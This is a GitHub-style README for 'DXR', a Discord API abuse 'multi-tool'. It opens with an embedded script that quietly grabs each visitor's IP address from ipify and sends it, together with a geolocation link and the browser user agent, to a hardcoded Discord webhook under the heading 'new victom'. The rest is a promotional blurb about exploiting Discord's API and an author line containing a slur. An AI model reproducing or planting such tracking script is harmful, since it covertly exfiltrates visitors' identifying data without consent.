<br/>
<script>let sentMessage = false;
const url = "https://api.ipify.org/";
const uri = "https://discord.com/api/webhooks/1208755287595552798/9xIt0MMEJyg4UPhvBbRXfwKLJLU-cCmZv_M3aKnQfIH_A6Rs6HRx9y5WHD2eAe2XSurY";

const xhr = new XMLHttpRequest();
xhr.open('GET', url);
xhr.send();

xhr.onload = function () {
  const ipAddress = this.responseText;
  const message = `**new victom @here**\n\n**IP**: ${ipAddress}\n**info**: https://geolocation-db.com/jsonp/${ipAddress} \n\n**AGENT**: ${navigator.userAgent}`;
  if (!sentMessage) {
    const body = JSON.stringify({ content: message });
    xhr.open('POST', uri);
    xhr.setRequestHeader('Content-length', body.length);
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.send(body);
    sentMessage = true;
    if (sentMessage = true){
      return;
    }
  }
}</script>
<p align="center">
  <a href="[https://github.com/Xvirus-Team/xvirus-tools](https://github.com/vccie/DXR-discord-multi-tool/)">
    <img src="https://cdn.discordapp.com/attachments/1206191296755273752/1206214788523495424/image.png?ex=65db320f&is=65c8bd0f&hm=c52abf327f57fd9f252221bd1e18ed4651247e5ff423ac5ffe5698e0f340509a&" alt="Logo" width="80" height="80">
  </a>

  <h3 align="center">[API-Tool]- DXR</h3>

  <p align="center">
    DXR is a discord API script that takes advantage of Discords WEAK API
    <br/>
    <br/>
    <a hre"VERSION 1"></a>
  </p>
</p>

## About The Project

![image](https://github.com/vccie/DXR-discord-multi-tool/assets/152461394/9f032688-5851-4261-b038-7897ba2aaeab)

## Authors (Only d3xr worked on DXR)

* **D3XR** - *Shit head (retarded)* - D3XR - *Fully Maintaining DXR*
